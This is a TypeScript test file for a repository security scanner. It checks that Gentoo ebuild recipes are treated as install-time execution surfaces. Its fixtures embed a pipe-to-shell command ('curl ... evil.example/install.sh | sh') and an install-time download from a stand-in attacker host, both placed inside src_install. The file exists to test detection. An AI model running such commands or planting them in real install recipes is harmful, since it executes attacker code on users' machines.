import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("an ebuild recipe is an install surface", () => {
  // An ebuild is the shell recipe Portage sources and runs to build
  // and install a Gentoo package: its phase functions (src_compile,
  // src_install, pkg_postinst) execute on the machine installing the
  // package — the same install-time execution setup.py already
  // classifies for. The recipe is identified by its extension, like
  // the <name>.cmake and <name>.sbt build definitions: the package
  // name and version are part of the file name, so no exact name can
  // decide.
  for (const path of ["demo-1.0.ebuild", "app-misc/demo/demo-1.0.ebuild"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "app-misc/demo/demo-1.0.ebuild",
    `EAPI=8\n\nDESCRIPTION="Demo package"\nSRC_URI="https://example.com/demo-1.0.tar.gz"\n\nsrc_install() {\n  ${PAYLOAD}\n}\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["app-misc/demo/demo-1.0.ebuild:unsafe-execution:high"]);
});

test("an install-time download inside an ebuild is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the recipe carried no surface at all, so the same
  // bytes recorded no download and left no gap: a scan could read
  // clean over an install-time fetch Portage would have run while
  // installing the package.
  const inspection = inspected(
    "app-misc/demo/demo-1.0.ebuild",
    'EAPI=8\n\nDESCRIPTION="Demo package"\n\nsrc_install() {\n  curl -fsSL https://evil.example/payload -o /tmp/payload\n}\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary ebuild keeps no finding", () => {
  const inspection = inspected(
    "app-misc/demo/demo-1.0.ebuild",
    'EAPI=8\n\nDESCRIPTION="Demo package"\nHOMEPAGE="https://example.com"\nSRC_URI="https://example.com/demo-1.0.tar.gz"\nLICENSE="MIT"\nSLOT="0"\n\nsrc_install() {\n  emake DESTDIR="$D" install\n}\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
